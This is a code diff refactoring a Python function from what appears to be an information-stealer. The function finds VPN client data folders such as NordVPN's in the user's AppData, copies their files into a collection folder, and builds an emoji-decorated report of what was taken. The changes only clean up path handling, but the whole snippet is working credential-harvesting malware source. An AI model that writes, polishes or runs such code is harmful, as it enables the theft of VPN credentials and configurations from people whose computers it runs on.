@@ -1,5 +1,5 @@
-from os import environ, sep, listdir,mkdir
-from os.path import exists
+from os import environ, listdir, mkdir
+from os.path import exists, join
 from glob import glob
 from shutil import copy
 from manager.logger import Log
@@ -9,8 +9,8 @@ def VPN():
     data= ""
     data += "\n\n\n<b>📡VPN📡</b>"
     Log("===========VPN===========")
-    local = environ['USERPROFILE'] + sep + r'AppData\Local'
-    appdata = environ['USERPROFILE'] + sep + r'AppData\Roaming'
+    local = environ["LOCALAPPDATA"]
+    appdata = environ["APPDATA"]
 
     directory = {
         'Nord VPN': local + '\\NordVPN\\',
@@ -33,14 +33,14 @@ def VPN():
 
     
     if logs:
-            try:
-                pathToLogs = f'{config.pathToLogs}\\VPN'
-                mkdir(pathToLogs)
-                for key, value in logs.items():
-                    mkdir(f'{pathToLogs}\\'+key+'\\')
-                    copy(value, f'{pathToLogs}\\'+key+'\\')
-                    data += f"\n∟⛓{key}"
-            except Exception as e:
-                Log(f"VPN(write) ---> {e}")
+        try:
+            pathToLogs = join(config.pathToLogs, "VPN")
+            mkdir(pathToLogs)
+            for key, value in logs.items():
+                mkdir(join(pathToLogs, key))
+                copy(value, join(pathToLogs, key))
+                data += f"\n∟⛓{key}"
+        except Exception as e:
+            Log(f"VPN(write) ---> {e}")
 
     return data
